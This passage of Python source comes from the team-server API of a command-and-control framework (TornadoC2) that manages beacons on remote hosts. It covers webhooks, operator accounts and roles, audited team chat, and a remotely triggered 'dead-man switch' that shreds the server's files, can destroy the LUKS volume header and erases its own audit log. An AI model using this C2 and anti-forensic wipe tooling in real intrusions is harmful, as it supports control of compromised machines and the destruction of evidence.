                kind=(payload.get('kind') or 'slack').strip().lower(),
                url=(payload.get('url') or '').strip(),
                events=payload.get('events') or ['new-beacon'],
                chat_id=(payload.get('chat_id') or '').strip(),
                min_severity=(payload.get('min_severity')
                              or 'info'),
                added_by=name)
        except ValueError as exc:
            return self._err_400(name, role, ip,
                                'webhooks.add', str(exc))
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='webhooks.add', target=entry['id'],
            detail=(f'kind={entry["kind"]} '
                    f'events={",".join(entry["events"])}'))
        return jsonify({'ok': True, 'id': entry['id'],
                        'audit_id': audit_id})

    def _webhooks_remove(self, name, role, ip):
        if self.webhooks is None:
            return Response(status=503)
        is_admin = constants.has_capability(
            role, 'webhooks.manage.admin', is_local=False)
        payload = request.get_json(force=True, silent=True) or {}
        wid = (payload.get('id') or '').strip()
        if not wid:
            return self._err_400(name, role, ip,
                                'webhooks.remove', 'missing id')
        try:
            entry = self.webhooks.remove(
                wid, requester=name, is_admin=is_admin)
        except PermissionError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='webhooks.remove', target=wid,
                outcome='denied', detail=str(exc))
            resp = jsonify({'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 403
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        if entry is None:
            return self._err_400(name, role, ip,
                                'webhooks.remove',
                                f'webhook {wid} not found')
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='webhooks.remove', target=wid,
            detail=(f'kind={entry.get("kind","?")} '
                    f'owner={entry.get("added_by","?")}'))
        return jsonify({'ok': True, 'audit_id': audit_id})

    def _webhooks_test(self, name, role, ip):
        if self.webhooks is None:
            return Response(status=503)
        is_admin = constants.has_capability(
            role, 'webhooks.manage.admin', is_local=False)
        payload = request.get_json(force=True, silent=True) or {}
        wid = (payload.get('id') or '').strip()
        if not wid:
            return self._err_400(name, role, ip,
                                'webhooks.test', 'missing id')
        try:
            hook = self.webhooks.get(
                wid, requester=name, is_admin=is_admin)
        except PermissionError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='webhooks.test', target=wid,
                outcome='denied', detail=str(exc))
            resp = jsonify({'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 403
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        if hook is None:
            return self._err_400(name, role, ip,
                                'webhooks.test',
                                f'webhook {wid} not found')

        events = list(hook.get('events') or [])
        event = events[0] if events else 'new-beacon'
        sample = {
            'new-beacon': {
                'id': 0, 'user': 'test', 'host': 'test',
                'os': 'test', 'arch': 'test'},
            'kill-deadline': {
                'id': 0, 'host': 'test', 'remaining_hours': '0'},
            'schedule-complete': {
                'beacon': 0, 'verb': 'test', 'run': 0},
            'beacon-identity-mismatch': {
                'id': 0, 'host': 'test@test', 'attempts': 1},
            'beacon-signature-failure': {
                'id': 0, 'host': 'test@test',
                'task_id': 'test', 'rejected_total': 1},
        }.get(event, {'note': 'test'})

        self.webhooks.send_to_hook(hook, event, sample)
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='webhooks.test', target=wid,
            detail=(f'dispatched event={event} '
                    f'kind={hook.get("kind","?")}'))
        return jsonify({'ok': True, 'event': event,
                        'audit_id': audit_id})

    # ------------------------------------------------------------------
    # Remote operator management

    def _operators_list(self, name, role, ip):
        """Return the operator registry.

        Every field the registry stores is returned except for the
        private key material, which is never exposed over the API
        even to admins. An admin who needs to hand a config to
        another operator must use the export command on the local
        console.
        """
        try:
            entries = self.registry.list()
        except Exception as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.list', outcome='error',
                detail=str(exc)[:200])
            resp = jsonify({'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 500
            return resp

        safe = []
        for e in entries:
            safe.append({
                'name':    e.get('name') or e.get('cn') or '?',
                'role':    e.get('role', '?'),
                'revoked': bool(e.get('revoked')),
                'added':   e.get('added'),
            })

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='operator.list', detail=f'{len(safe)} operators')
        resp = jsonify({'operators': safe, 'audit_id': audit_id})
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _operators_add(self, name, role, ip):
        """Register a new operator.

        Remote admins can create viewer and operator accounts.
        Creating an admin account requires `operator.add.admin`,
        which is LOCAL_ONLY — the caller can never hold it remotely,
        so a request with role=admin is always refused.
        """
        payload = request.get_json(force=True, silent=True) or {}
        new_name = (payload.get('name') or '').strip()
        new_role = (payload.get('role') or 'operator').strip().lower()
        new_password = payload.get('password') or ''
        if new_password and not isinstance(new_password, str):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.add', target=new_name,
                outcome='error', detail='password not a string')
            resp = jsonify({'error': 'password must be a string',
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        if not new_name:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.add', outcome='error',
                detail='missing name')
            resp = jsonify({'error': 'missing name',
                            'audit_id': audit_id})
            resp.status_code = 400
            return resp

        if new_role == 'admin':
            if not constants.has_capability(
                    role, 'operator.add.admin', is_local=False):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='operator.add', target=new_name,
                    outcome='denied',
                    detail='remote callers cannot mint admins')
                resp = jsonify({
                    'error': ('creating admin accounts requires '
                              'the local console'),
                    'audit_id': audit_id})
                resp.status_code = 403
                return resp

        if new_role not in ('viewer', 'guardian', 'operator', 'admin'):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.add', target=new_name,
                outcome='error',
                detail=f'invalid role {new_role!r}')
            resp = jsonify({'error': f'invalid role: {new_role}',
                            'audit_id': audit_id})
            resp.status_code = 400
            return resp

        try:
            self.registry.add(new_name, role=new_role,
                              password=new_password)
        except Exception as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.add', target=new_name,
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='operator.add', target=new_name,
            detail=(f'role={new_role} '
                    f'password={"yes" if new_password else "no"}'))
        resp = jsonify({'ok': True, 'name': new_name,
                        'role': new_role, 'audit_id': audit_id})
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _operators_remove(self, name, role, ip):
        """Remove an operator from the registry.

        A remote admin cannot remove another admin. The check is
        the same shape as the add path: the `operator.remove.admin`
        capability is LOCAL_ONLY, so a request targeting an admin
        account is refused before the registry is touched.
        """
        payload = request.get_json(force=True, silent=True) or {}
        target = (payload.get('name') or '').strip()
        if not target:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.remove', outcome='error',
                detail='missing name')
            resp = jsonify({'error': 'missing name',
                            'audit_id': audit_id})
            resp.status_code = 400
            return resp

        try:
            entry = self.registry.get(target)
        except Exception:
            entry = None
        if entry is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.remove', target=target,
                outcome='error', detail='not found')
            resp = jsonify({'error': f'{target} not found',
                            'audit_id': audit_id})
            resp.status_code = 404
            return resp

        if entry.get('role') == 'admin':
            if not constants.has_capability(
                    role, 'operator.remove.admin', is_local=False):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='operator.remove', target=target,
                    outcome='denied',
                    detail='remote callers cannot remove admins')
                resp = jsonify({
                    'error': ('removing admin accounts requires '
                              'the local console'),
                    'audit_id': audit_id})
                resp.status_code = 403
                return resp

        if target == name:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.remove', target=target,
                outcome='denied',
                detail='self-removal refused')
            resp = jsonify({
                'error': 'refusing to remove your own account',
                'audit_id': audit_id})
            resp.status_code = 403
            return resp

        try:
            self.registry.remove(target)
        except Exception as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.remove', target=target,
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='operator.remove', target=target)
        resp = jsonify({'ok': True, 'name': target,
                        'audit_id': audit_id})
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _operators_set_role(self, name, role, ip):
        """Change an operator's role.

        Neither the target nor the new role may be `admin` on a
        remote call. Promoting to admin requires the local console.
        Demoting an existing admin requires the local console.
        """
        payload = request.get_json(force=True, silent=True) or {}
        target = (payload.get('name') or '').strip()
        new_role = (payload.get('role') or '').strip().lower()

        if not target:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.set_role', outcome='error',
                detail='missing name')
            resp = jsonify({'error': 'missing name',
                            'audit_id': audit_id})
            resp.status_code = 400
            return resp

        if new_role not in ('viewer', 'guardian', 'operator', 'admin'):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.set_role', target=target,
                outcome='error',
                detail=f'invalid role {new_role!r}')
            resp = jsonify({'error': f'invalid role: {new_role}',
                            'audit_id': audit_id})
            resp.status_code = 400
            return resp

        if new_role == 'admin':
            if not constants.has_capability(
                    role, 'operator.set_role.admin', is_local=False):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='operator.set_role', target=target,
                    outcome='denied',
                    detail='remote callers cannot promote to admin')
                resp = jsonify({
                    'error': ('promoting to admin requires the '
                              'local console'),
                    'audit_id': audit_id})
                resp.status_code = 403
                return resp

        try:
            entry = self.registry.get(target)
        except Exception:
            entry = None
        if entry is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.set_role', target=target,
                outcome='error', detail='not found')
            resp = jsonify({'error': f'{target} not found',
                            'audit_id': audit_id})
            resp.status_code = 404
            return resp

        if entry.get('role') == 'admin' and new_role != 'admin':
            if not constants.has_capability(
                    role, 'operator.set_role.admin', is_local=False):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='operator.set_role', target=target,
                    outcome='denied',
                    detail='remote callers cannot demote admins')
                resp = jsonify({
                    'error': ('demoting an admin requires the '
                              'local console'),
                    'audit_id': audit_id})
                resp.status_code = 403
                return resp

        if target == name and new_role != role:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.set_role', target=target,
                outcome='denied', detail='self-demotion refused')
            resp = jsonify({
                'error': 'refusing to change your own role',
                'audit_id': audit_id})
            resp.status_code = 403
            return resp

        try:
            self.registry.set_role(target, new_role)
        except Exception as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.set_role', target=target,
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='operator.set_role', target=target,
            detail=f'{entry.get("role","?")} -> {new_role}')
        resp = jsonify({'ok': True, 'name': target,
                        'role': new_role, 'audit_id': audit_id})
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _operators_passwd(self, name, role, ip):
        """Reset a password.

        Self-reset is always allowed. Resetting another operator
        requires admin. Resetting another admin requires the
        LOCAL_ONLY operator.passwd.other.admin capability, which
        no remote caller holds.

        The old password is not required on a self-change. The
        operator is already authenticated with mTLS + a current
        password HMAC. Adding a prompt for the old password would
        be a speed bump, not a security control — anyone who can
        make requests from the operator's session can also read
        the keyboard.

        An empty password clears the second factor entirely: the
        operator reverts to cert-only auth. Useful when a password
        is suspected leaked and you want to remove the factor
        rather than rotate it.
        """
        payload = request.get_json(force=True, silent=True) or {}
        target = (payload.get('name') or '').strip() or name
        new_password = payload.get('password') or ''

        if not isinstance(new_password, str):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.passwd', target=target,
                outcome='error',
                detail='password not a string')
            resp = jsonify({'error': 'password must be a string',
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        if target != name:
            if not constants.has_capability(
                    role, 'operator.passwd.other',
                    is_local=False):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='operator.passwd', target=target,
                    outcome='denied',
                    detail='role lacks operator.passwd.other')
                resp = jsonify({
                    'error': ('resetting another operator\'s '
                              'password requires admin'),
                    'audit_id': audit_id})
                resp.status_code = 403
                resp.headers['X-Audit-Id'] = audit_id
                return resp

        try:
            entry = self.registry.get(target)
        except Exception:
            entry = None
        if entry is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.passwd', target=target,
                outcome='error', detail='not found')
            resp = jsonify({'error': f'{target} not found',
                            'audit_id': audit_id})
            resp.status_code = 404
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        if entry.get('role') == 'admin' and target != name:
            if not constants.has_capability(
                    role, 'operator.passwd.other.admin',
                    is_local=False):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='operator.passwd', target=target,
                    outcome='denied',
                    detail=('remote callers cannot reset an '
                            'admin password'))
                resp = jsonify({
                    'error': ('resetting an admin password '
                              'requires the local console on '
                              'the team server machine'),
                    'audit_id': audit_id})
                resp.status_code = 403
                resp.headers['X-Audit-Id'] = audit_id
                return resp

        try:
            self.registry.set_password(target, new_password)
        except Exception as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.passwd', target=target,
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        config_b64 = None
        config_sha = None
        if target == name:
            try:
                entry_after = self.registry.get(target)
            except Exception as exc:
                print(f"[TEAM] passwd: registry.get({target!r}) "
                      f"failed: {exc}", flush=True)
                entry_after = None
            if entry_after is None:
                print(f"[TEAM] passwd: no record for {target!r} "
                      f"after set_password — not bundling a config",
                      flush=True)
            else:
                try:
                    blob, build_err = self._build_operator_config(
                        target, entry_after)
                except Exception as exc:
                    blob = None
                    build_err = f'{type(exc).__name__}: {exc}'
                if blob is None:
                    print(f"[TEAM] passwd: could not build config "
                          f"for {target!r}: "
                          f"{build_err or 'unknown reason'}",
                          flush=True)
                else:
                    raw = blob.encode('utf-8')
                    config_sha = hashlib.sha256(raw).hexdigest()
                    import base64 as _b64_cfg
                    config_b64 = _b64_cfg.b64encode(
                        raw).decode('ascii')
                    print(f"[TEAM] passwd: bundled fresh config "
                          f"for {target!r} "
                          f"(sha256={config_sha[:16]}…, "
                          f"{len(raw)} bytes)", flush=True)

        action_word = 'cleared' if not new_password else 'set'
        audit_detail = action_word
        if config_b64 is not None:
            audit_detail += f' config_sha256={config_sha}'
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='operator.passwd', target=target,
            detail=audit_detail)

        payload_out = {
            'ok':           True,
            'name':         target,
            'password_set': bool(new_password),
            'audit_id':     audit_id,
        }
        if config_b64 is not None:
            payload_out['config_b64']    = config_b64
            payload_out['config_sha256'] = config_sha
        resp = jsonify(payload_out)
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    # ------------------------------------------------------------------
    # Dead-man's switch endpoints

    def _deadman_status(self, name, role, ip):
        dm = self._deadman()
        if dm is None:
            return jsonify({'ok': False,
                            'error': 'dead-man switch not running'})

        return jsonify({
            'ok': True,
            'status': dm.status(),
            'halt_mode': getattr(dm, '_halt_mode', '') or 'none',
            'shred_mode': getattr(dm, 'SHRED_MODE', 'fast'),
            'shred_flags': {
                'prealloc': bool(getattr(dm, 'SHRED_PREALLOC', False)),
                'direct':   bool(getattr(dm, 'SHRED_DIRECT', False)),
                'trim':     bool(getattr(dm, 'SHRED_TRIM', False)),
                'syncfs':   bool(getattr(dm, 'SHRED_SYNCFS', False)),
            },
        })

    def _deadman_arm(self, name, role, ip):
        dm = self._deadman()
        if dm is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        spec = payload.get('duration')
        if not isinstance(spec, str) or not spec.strip():
            return jsonify({'ok': False,
                            'error': 'missing duration'})
        secs = dm.parse_duration(spec)
        if secs is None:
            return jsonify({'ok': False,
                            'error': f'invalid duration: '
                                     f'{spec!r}'})
        actual = dm.arm(secs, source=f'remote:{name}')
        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='deadman.arm',
            detail=f'window={actual:.0f}s source=remote')
        return jsonify({'ok': True, 'window_seconds': actual})

    def _deadman_arm_until(self, name, role, ip):
        dm = self._deadman()
        if dm is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        spec = payload.get('deadline')
        if not isinstance(spec, str):
            return jsonify({'ok': False,
                            'error': 'missing deadline'})
        ts = dm.parse_deadline(spec)
        if ts is None:
            return jsonify({'ok': False,
                            'error': f'invalid deadline: '
                                     f'{spec!r} (expected HH:MM)'})
        try:
            actual = dm.arm_until(ts, source=f'remote:{name}')
        except ValueError as exc:
            return jsonify({'ok': False, 'error': str(exc)})
        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='deadman.arm',
            detail=f'deadline={int(ts)} window={actual:.0f}s '
                   f'source=remote')
        return jsonify({'ok': True,
                        'window_seconds': actual,
                        'deadline': ts})

    def _deadman_reset(self, name, role, ip):
        """`deadman reset` re-arms with a fresh window. Requires a
        duration, matching the local console's behaviour."""
        dm = self._deadman()
        if dm is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        spec = payload.get('duration')
        if not isinstance(spec, str) or not spec.strip():
            return jsonify({'ok': False,
                            'error': 'missing duration'})
        secs = dm.parse_duration(spec)
        if secs is None:
            return jsonify({'ok': False,
                            'error': f'invalid duration: '
                                     f'{spec!r}'})
        actual = dm.arm(secs, source=f'remote:{name}')
        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='deadman.reset',
            detail=f'window={actual:.0f}s source=remote')
        return jsonify({'ok': True, 'window_seconds': actual})

    def _deadman_disable(self, name, role, ip):
        dm = self._deadman()
        if dm is None:
            return Response(status=503)
        was = dm.disable()
        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='deadman.disable',
            detail=f'was={was:.0f}s source=remote')
        return jsonify({'ok': True, 'was': was})

    def _deadman_warn(self, name, role, ip):
        dm = self._deadman()
        if dm is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        raw = payload.get('fractions')
        if raw is None:
            return jsonify({'ok': False,
                            'error': 'missing fractions'})
        if isinstance(raw, str):
            if raw.strip().lower() in ('none', 'off', 'clear', ''):
                fracs = []
            else:
                try:
                    fracs = [float(x.strip())
                             for x in raw.split(',') if x.strip()]
                except ValueError:
                    return jsonify({'ok': False,
                                    'error': f'invalid fractions: '
                                             f'{raw!r}'})
        elif isinstance(raw, list):
            try:
                fracs = [float(x) for x in raw]
            except (TypeError, ValueError):
                return jsonify({'ok': False,
                                'error': 'invalid fractions'})
        else:
            return jsonify({'ok': False,
                            'error': 'fractions must be a list '
                                     'or a string'})
        cleaned = dm.set_warn_fractions(fracs)
        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='deadman.warn',
            detail=f'fractions={list(cleaned)} source=remote')
        return jsonify({'ok': True,
                        'fractions': list(cleaned)})

    def _deadman_halt_mode(self, name, role, ip):
        dm = self._deadman()
        if dm is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        mode = (payload.get('mode') or '').strip().lower()
        try:
            cleaned = dm.set_halt_mode(mode)
        except ValueError as exc:
            return jsonify({'ok': False, 'error': str(exc)})
        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='deadman.halt_set',
            detail=f'mode={cleaned or "none"} source=remote')
        return jsonify({'ok': True, 'mode': cleaned})

    def _deadman_shred_mode(self, name, role, ip):
        dm = self._deadman()
        if dm is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        mode = (payload.get('mode') or '').strip().lower()
        pattern_modes = ('fast', 'random', 'dod', 'gutmann',
                         'nist', 'schneier', 'hmg', 'bsi')
        structural_modes = ('crypto', 'scrub', 'trim')
        valid = pattern_modes + structural_modes

        if mode not in valid:
            return jsonify({
                'ok': False,
                'error': f'shred mode must be one of '
                         f'{", ".join(valid)}',
            })

        if mode == 'crypto' and payload.get('confirm') is not True:
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='deadman.shred',
                outcome='denied',
                detail='crypto mode requires confirm=true')
            resp = jsonify({
                'ok': False,
                'error': (
                    'crypto mode destroys the LUKS header of the '
                    'volume holding the tree — every byte on that '
                    'volume becomes unrecoverable, including data '
                    'outside the TornadoC2 tree. Resend with '
                    '{"mode": "crypto", "confirm": true} to '
                    'proceed.'),
            })
            resp.status_code = 400
            return resp

        dm.SHRED_MODE = mode
        try:
            dm._save_config()
        except Exception:
            pass
        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='deadman.shred',
            detail=f'mode={mode} source=remote')
        return jsonify({'ok': True, 'mode': mode})

    def _deadman_halt(self, name, role, ip):
        """Invoke the shutdown sequence remotely.

        Stops every listener, wipes the configured tree, runs the
        configured power action, then exits. Execution is deferred
        two seconds so the HTTP response reaches the client before
        the operator listener stops.

        The audit entry and a stdout line naming the caller are
        written before the wipe runs; the audit log itself is
        destroyed along with everything else, so the durable record
        is the stdout line captured by journald / docker logs.
        """
        import threading as _th
        dm = self._deadman()
        if dm is None:
            return Response(status=503)

        payload = request.get_json(force=True, silent=True) or {}
        if payload.get('confirm') is not True:
            return jsonify({
                'ok': False,
                'error': 'confirmation required — send '
                         '{"confirm": true} to proceed',
            })

        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='deadman.remote_halt',
            target='team_server',
            detail=f'mode={dm._halt_mode or "none"} '
                   f'by={name}@{ip} source=remote')

        try:
            print(f"\n[DEADMAN] REMOTE HALT by {name}@{ip} "
                  f"(role={role}, mode={dm._halt_mode or 'none'}) "
                  f"— wiping state and exiting", flush=True)
        except Exception:
            pass

        def _deferred():
            time.sleep(2.0)
            try:
                dm.manual_halt(reason=f'remote:{name}@{ip}')
            except Exception:
                _os._exit(1)

        _th.Thread(target=_deferred, daemon=True).start()
        return jsonify({
            'ok': True,
            'executing': dm._halt_mode or 'none',
            'note': 'listeners will stop within ~2 seconds',
        })

    # ------------------------------------------------------------------
    # Team chat

    def _chat_send(self, name, role, ip):
        """Append one message to the room and record it in the
        audit chain.

        Every message is written to the hash-chained audit log
        before the response is returned. This is the property
        that makes chat "secure against operators": an operator
        cannot deny having sent a message, and cannot delete or
        edit a message without breaking the chain. The chain is
        walked on every server start, and a broken chain refuses
        to boot.

        `name` comes from `_extract_peer`, which reads the mTLS
        CN. The request body cannot influence it. The message text
        itself is the only client-controlled field, and it is
        stored verbatim — the audit `detail` field caps at 4096
        bytes, matching ChatRoom.MAX_TEXT_LEN.

        Rate limited separately from the general bucket so a chat
        flood cannot starve operational endpoints. Chat now costs
        one fsync per message, so the limiter is tighter than the
        general one.
        """
        payload = request.get_json(force=True, silent=True) or {}
        kind = (payload.get('kind') or 'chat').strip().lower()

        if not _chat_rate_allowed(name):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.message', outcome='throttled',
                detail='chat rate limit exceeded')
            resp = jsonify({
                'error': 'chat rate limit exceeded',
                'hint': (f'{constants.CHAT_PER_SEC}/sec sustained, '
                         f'{constants.CHAT_BURST} burst'),
            })
            resp.status_code = 429
            return resp

        recipient = ''
        if kind == 'dm':
            recipient = (payload.get('recipient') or '').strip()
            if not recipient:
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='chat.message', outcome='error',
                    detail='dm with empty recipient')
                resp = jsonify({
                    'error': 'dm requires a recipient',
                    'audit_id': audit_id})
                resp.status_code = 400
                resp.headers['X-Audit-Id'] = audit_id
                return resp
            if recipient == name:
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='chat.message', outcome='error',
                    detail='dm to self')
                resp = jsonify({
                    'error': 'cannot dm yourself',
                    'audit_id': audit_id})
                resp.status_code = 400
                resp.headers['X-Audit-Id'] = audit_id
                return resp
            try:
                rentry = self.registry.get(recipient)
            except Exception:
                rentry = None
            if rentry is None:
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='chat.message', target=recipient,
                    outcome='error',
                    detail='dm recipient not found')
                resp = jsonify({
                    'error': f'recipient {recipient!r} not found',
                    'audit_id': audit_id})
                resp.status_code = 400
                resp.headers['X-Audit-Id'] = audit_id
                return resp
            if rentry.get('revoked'):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='chat.message', target=recipient,
                    outcome='error',
                    detail='dm recipient is revoked')
                resp = jsonify({
                    'error': f'recipient {recipient!r} is revoked',
                    'audit_id': audit_id})
                resp.status_code = 400
                resp.headers['X-Audit-Id'] = audit_id
                return resp

        if kind == 'notice':
            event = (payload.get('event') or '').strip().lower()
            if event not in _CHAT_NOTICE_TEXTS:
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='chat.message', outcome='error',
                    detail=f'invalid notice event: {event!r}')
                resp = jsonify({
                    'error': 'notice event must be one of: '
                             + ', '.join(sorted(_CHAT_NOTICE_TEXTS)),
                    'audit_id': audit_id})
                resp.status_code = 400
                resp.headers['X-Audit-Id'] = audit_id
                return resp
            text = _CHAT_NOTICE_TEXTS[event]
        else:
            text = payload.get('text', '')

        result = sanitize_chat(text)
        if result.was_modified:
            detail = (f'stripped={result.bytes_stripped} '
                      f'iter={result.iterations} '
                      f'v={SANITIZER_VERSION} '
                      f'raw_sha256={result.raw_sha256}')
            if result.raw_b64:
                detail += f' raw_b64={result.raw_b64}'
                if result.raw_truncated:
                    detail += ' raw_truncated=1'
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.message', outcome='sanitized',
                detail=detail)

        try:
            msg = self.chat.post(
                name, role, result.text, kind=kind, source_ip=ip,
                recipient=recipient)
        except ValueError as exc:
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.message', outcome='error',
                detail=f'invalid message: {str(exc)[:200]}')
            resp = jsonify({'error': str(exc)})
            resp.status_code = 400
            return resp

        audit_text = msg.get('text', '')
        if kind == 'action':
            detail = f'* {audit_text}'
            target = 'team'
        elif kind == 'dm':
            detail = f'to={recipient}: {audit_text}'
            target = recipient
        else:
            detail = audit_text
            target = 'team'
        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='chat.message', target=target,
            outcome='ok', detail=detail)

        return jsonify({'ok': True, 'message': msg})

    def _chat_poll(self, name, role, ip):
        """Long-poll for new messages.

        Returns every message with id > `after`, blocking up to
        `wait` seconds for at least one to arrive. Clamped at 5s —
        same reasoning as _beacon_result: an unbounded wait pins a
        werkzeug worker thread for as long as the client asks,
        and the rate limiter counts requests, not in-flight ones.
        """
        payload = request.get_json(force=True, silent=True) or {}

        try:
            after = int(payload.get('after', 0))
        except (TypeError, ValueError):
            return Response(status=400)
        try:
            wait = float(payload.get('wait', 0.0))
        except (TypeError, ValueError):
            return Response(status=400)
        wait = max(0.0, min(wait, 5.0))

        _presence_record(name)

        msgs = self.chat.since(after, timeout=wait, viewer=name)
        last = msgs[-1]['id'] if msgs else after
        return jsonify({
            'messages': msgs,
            'last_id':  last,
            'topic':    self.chat.get_topic(),
        })

    def _chat_history(self, name, role, ip):
        if not _chat_rate_allowed(name):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.history', outcome='throttled',
                detail='chat rate limit exceeded')
            resp = jsonify({
                'error': 'chat rate limit exceeded',
                'hint': (f'{constants.CHAT_PER_SEC}/sec sustained, '
                         f'{constants.CHAT_BURST} burst'),
            })
            resp.status_code = 429
            return resp

        payload = request.get_json(force=True, silent=True) or {}

        try:
            limit = int(payload.get('limit', 50))
        except (TypeError, ValueError):
            limit = 50

        limit = max(1, min(limit, 500))
        peer = (payload.get('peer') or '').strip() or None
        persistent = bool(payload.get('persistent'))

        if persistent:
            msgs = self.chat.persistent_history(
                limit, viewer=name, peer=peer)
        else:
            msgs = self.chat.history(limit, viewer=name, peer=peer)

        return jsonify({
            'messages':   msgs,
            'topic':      self.chat.get_topic(),
            'persistent': persistent,
        })

    def _chat_who(self, name, role, ip):
        """Return who is at the chat prompt right now.

        Derived from the poll heartbeat, not from message
        history. An operator is active if their client has
        polled within PRESENCE_WINDOW seconds. Operators whose
        cert is revoked or who are not in the registry are
        omitted, so a revoked operator's lingering presence
        entry does not leak into the roster.
        """
        snapshot = _presence_snapshot()
        result = []
        for cn, idle in sorted(snapshot.items()):
            try:
                entry = self.registry.get(cn)
            except Exception:
                entry = None
            if entry is None or entry.get('revoked'):
                continue
            result.append({
                'name':         cn,
                'role':         entry.get('role', 'viewer'),
                'idle_seconds': round(idle, 1),
                'active':       idle < PRESENCE_WINDOW,
            })
        if not any(r['name'] == name for r in result):
            result.append({
                'name':         name,
                'role':         role,
                'idle_seconds': 0.0,
                'active':       True,
            })
        return jsonify({'operators': result})

    def _chat_topic(self, name, role, ip):
        """Read or set the pinned topic line.

        Two read paths and one write path:

          * `GET` — reads the topic.
          * `POST` with **no** `text` key — reads the topic.
            The client's transport only speaks POST, so a POST
            with an empty body has to mean read. A POST that
            carries `{"text": ""}` is a clear, and the key is
            present, so the two are distinguishable.
          * `POST` with a `text` key — sets (or clears) the
            topic. The new value and the old value are written
            to the audit chain so a topic change is not silent.

        A write consumes a token from the chat bucket, same as
